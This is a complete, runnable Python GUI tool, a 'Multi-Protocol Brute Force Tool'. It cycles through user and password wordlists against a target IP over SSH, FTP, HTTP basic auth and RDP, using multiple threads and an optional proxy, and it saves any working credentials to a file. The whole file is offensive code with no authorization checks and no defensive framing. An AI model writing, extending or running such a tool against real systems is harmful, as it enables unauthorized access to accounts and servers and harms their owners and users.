#!/usr/bin/env python3
import threading
from queue import Queue
import requests
import subprocess

try:
    import paramiko
except ImportError:
    paramiko = None

from ftplib import FTP

import tkinter as tk
from tkinter import filedialog, messagebox, ttk, font

# Color palette
BG_BLUE = "#232b60"
PURPLE = "#7d5fff"
WHITE = "#ffffff"
GOLD = "#ffd700"
LABEL_FG = WHITE
ENTRY_FG = PURPLE
ENTRY_BG = WHITE
ENTRY_FONT = ("Arial", 11, "bold")

DEFAULT_PORTS = {
    "ssh": 22,
    "ftp": 21,
    "http": 80,
    "rdp": 3389,
}

def try_ssh(host, port, username, password, timeout=5, proxy=None):
    if not paramiko:
        return False, "Paramiko not installed"
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, password=password, timeout=timeout)
        client.close()
        return True, ""
    except Exception as e:
        return False, str(e)

def try_ftp(host, port, username, password, timeout=5, proxy=None):
    try:
        ftp = FTP()
        ftp.connect(host, port, timeout=timeout)
        ftp.login(username, password)
        ftp.quit()
        return True, ""
    except Exception as e:
        return False, str(e)

def try_http(host, port, username, password, timeout=5, proxy=None):
    url = f"http://{host}:{port}"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        resp = requests.get(url, auth=(username, password), timeout=timeout, proxies=proxies)
        if resp.status_code == 200:
            return True, ""
        else:
            return False, f"HTTP {resp.status_code}"
    except Exception as e:
        return False, str(e)

def try_rdp(host, port, username, password, timeout=5, proxy=None):
    try:
        cmd = [
            "xfreerdp",
            f"/v:{host}:{port}",
            f"/u:{username}",
            f"/p:{password}",
            "/cert:ignore",
            f"/timeout:{timeout * 1000}"
        ]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout+2)
        output = result.stdout.decode() + result.stderr.decode()
        if "Authentication only, exit status 0" in output or "connected to" in output:
            return True, ""
        elif "Authentication failure" in output or "ERRCONNECT_LOGON_FAILURE" in output:
            return False, "Authentication failure"
        else:
            return False, output.strip()
    except subprocess.TimeoutExpired:
        return False, "Timeout"
    except Exception as e:
        return False, str(e)

PROTOCOLS = {
    "ssh": try_ssh,
    "ftp": try_ftp,
    "http": try_http,
    "rdp": try_rdp,
}

def brute_worker(q, protocol, host, port, timeout, proxy, results, progress_cb=None):
    handler = PROTOCOLS[protocol]
    while True:
        item = q.get()
        if item is None:
            break
        username, password = item
        this_proxy = proxy if protocol == "http" else None
        success, err = handler(host, port, username, password, timeout, this_proxy)
        if success:
            results.append((username, password))
        if progress_cb:
            progress_cb()
        q.task_done()

def load_list(filename):
    with open(filename, "r") as f:
        return [line.strip() for line in f if line.strip()]

class BruteForceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Multi-Protocol Brute Force Tool")
        self.root.configure(bg=BG_BLUE)

        self.title_font = font.Font(family="Arial Black", size=18, weight="bold")
        self.label_font = font.Font(family="Arial", size=11, weight="bold")
        self.button_font = font.Font(family="Arial", size=10, weight="bold")

        tk.Label(root, text="Brute Force Tool", font=self.title_font, bg=BG_BLUE, fg=GOLD).pack(pady=(10, 5))

        self.protocol_var = tk.StringVar(value="ssh")
        self.protocol_var.trace("w", self.update_port)
        tk.Label(root, text="Protocol:", font=self.label_font, bg=BG_BLUE, fg=LABEL_FG).pack(anchor="w", padx=30)
        tk.OptionMenu(root, self.protocol_var, *PROTOCOLS.keys()).pack(padx=30, fill="x")

        tk.Label(root, text="Target IP:", font=self.label_font, bg=BG_BLUE, fg=LABEL_FG).pack(anchor="w", padx=30)
        self.target_entry = tk.Entry(root, bg=ENTRY_BG, fg=ENTRY_FG, font=ENTRY_FONT)
        self.target_entry.pack(padx=30, fill="x")

        tk.Label(root, text="Port:", font=self.label_font, bg=BG_BLUE, fg=LABEL_FG).pack(anchor="w", padx=30)
        self.port_entry = tk.Entry(root, width=6, bg=ENTRY_BG, fg=PURPLE, font=ENTRY_FONT, justify="center")
        self.port_entry.insert(0, str(DEFAULT_PORTS[self.protocol_var.get()]))
        self.port_entry.pack(padx=30, anchor="w")

        tk.Label(root, text="Threads:", font=self.label_font, bg=BG_BLUE, fg=LABEL_FG).pack(anchor="w", padx=30)
        self.threads_entry = tk.Entry(root, width=6, bg=ENTRY_BG, fg=PURPLE, font=ENTRY_FONT, justify="center")
        self.threads_entry.insert(0, "4")
        self.threads_entry.pack(padx=30, anchor="w")

        tk.Label(root, text="Timeout:", font=self.label_font, bg=BG_BLUE, fg=LABEL_FG).pack(anchor="w", padx=30)
        self.timeout_entry = tk.Entry(root, width=6, bg=ENTRY_BG, fg=PURPLE, font=ENTRY_FONT, justify="center")
        self.timeout_entry.insert(0, "5")
        self.timeout_entry.pack(padx=30, anchor="w")

        tk.Label(root, text="Proxy (HTTP only):", font=self.label_font, bg=BG_BLUE, fg=LABEL_FG).pack(anchor="w", padx=30)
        self.proxy_entry = tk.Entry(root, bg=ENTRY_BG, fg=ENTRY_FG, font=ENTRY_FONT)
        self.proxy_entry.pack(padx=30, fill="x")

        self.userlist_path = tk.StringVar()
        tk.Label(root, text="Userlist File:", font=self.label_font, bg=BG_BLUE, fg=LABEL_FG).pack(anchor="w", padx=30)
        tk.Entry(root, textvariable=self.userlist_path, bg=ENTRY_BG, fg=ENTRY_FG, font=ENTRY_FONT).pack(padx=30, fill="x")
        tk.Button(root, text="Browse", command=self.browse_userlist, bg=PURPLE, fg=WHITE, font=self.button_font, activebackground=GOLD, activeforeground=BG_BLUE).pack(padx=30, fill="x")

        self.passlist_path = tk.StringVar()
        tk.Label(root, text="Passlist File:", font=self.label_font, bg=BG_BLUE, fg=LABEL_FG).pack(anchor="w", padx=30)
        tk.Entry(root, textvariable=self.passlist_path, bg=ENTRY_BG, fg=ENTRY_FG, font=ENTRY_FONT).pack(padx=30, fill="x")
        tk.Button(root, text="Browse", command=self.browse_passlist, bg=PURPLE, fg=WHITE, font=self.button_font, activebackground=GOLD, activeforeground=BG_BLUE).pack(padx=30, fill="x")

        tk.Button(root, text="Start Brute Force", command=self.run_bruteforce, bg=GOLD, fg=BG_BLUE, font=self.button_font, activebackground=PURPLE, activeforeground=WHITE).pack(pady=10, padx=30, fill="x")

        style = ttk.Style()
        style.theme_use('default')
        style.configure("TProgressbar", thickness=20, troughcolor="#3d246c", background=GOLD, bordercolor=GOLD, lightcolor=GOLD, darkcolor=GOLD)
        self.progress = ttk.Progressbar(root, orient='horizontal', length=300, mode='determinate', style="TProgressbar")
        self.progress.pack(padx=30, fill="x")

        self.progress_label = tk.Label(root, text="Progress: 0/0", font=self.label_font, bg=BG_BLUE, fg=LABEL_FG)
        self.progress_label.pack()

        self.result_text = tk.Text(root, height=10, bg=WHITE, fg=BG_BLUE, font=("Consolas", 11, "bold"))
        self.result_text.pack(padx=30, pady=10, fill="both", expand=True)

        self.save_button = tk.Button(root, text="Save Results", command=self.save_results_gui, state=tk.DISABLED, bg=PURPLE, fg=WHITE, font=self.button_font, activebackground=GOLD, activeforeground=BG_BLUE)
        self.save_button.pack(pady=2, padx=30, fill="x")

        self.results = []

    def update_port(self, *args):
        proto = self.protocol_var.get()
        self.port_entry.delete(0, tk.END)
        self.port_entry.insert(0, str(DEFAULT_PORTS[proto]))

    def browse_userlist(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            self.userlist_path.set(file_path)

    def browse_passlist(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            self.passlist_path.set(file_path)

    def run_bruteforce(self):
        protocol = self.protocol_var.get()
        target = self.target_entry.get()
        try:
            port = int(self.port_entry.get())
        except ValueError:
            port = DEFAULT_PORTS[protocol]
        try:
            threads = int(self.threads_entry.get())
        except ValueError:
            threads = 4
        try:
            timeout = int(self.timeout_entry.get())
        except ValueError:
            timeout = 5
        proxy = self.proxy_entry.get() if self.proxy_entry.get() else None

        try:
            userlist = load_list(self.userlist_path.get())
        except Exception:
            messagebox.showerror("Error", "Failed to load userlist file.")
            return

        try:
            passlist = load_list(self.passlist_path.get())
        except Exception:
            messagebox.showerror("Error", "Failed to load passlist file.")
            return

        total = len(userlist) * len(passlist)
        self.progress["maximum"] = total
        self.progress["value"] = 0
        self.progress_label.config(text=f"Progress: 0/{total}")

        self.result_text.delete("1.0", tk.END)
        self.save_button.config(state=tk.DISABLED)
        self.results = []

        q = Queue()
        results = []

        for username in userlist:
            for password in passlist:
                q.put((username, password))

        def update_progress():
            val = self.progress["value"] + 1
            self.progress["value"] = val
            self.progress_label.config(text=f"Progress: {val}/{total}")

        def run():
            threads_list = []
            for _ in range(threads):
                t = threading.Thread(target=brute_worker, args=(
                    q, protocol, target, port, timeout, proxy, results, update_progress
                ))
                t.daemon = True
                t.start()
                threads_list.append(t)
            q.join()
            for _ in threads_list:
                q.put(None)
            for t in threads_list:
                t.join()

            self.results = results
            if results:
                for u, p in results:
                    self.result_text.insert(tk.END, f"👍 Success: {u}:{p}\n")
            else:
                self.result_text.insert(tk.END, "No valid credentials found.\n")
            self.save_button.config(state=tk.NORMAL)

        threading.Thread(target=run, daemon=True).start()

    def save_results_gui(self):
        if not self.results:
            messagebox.showinfo("No Results", "No results to save.")
            return
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, "w") as f:
                for u, p in self.results:
                    f.write(f"{u}:{p}\n")
            messagebox.showinfo("Saved", f"Results saved to {file_path}")

def main():
    root = tk.Tk()
    app = BruteForceGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
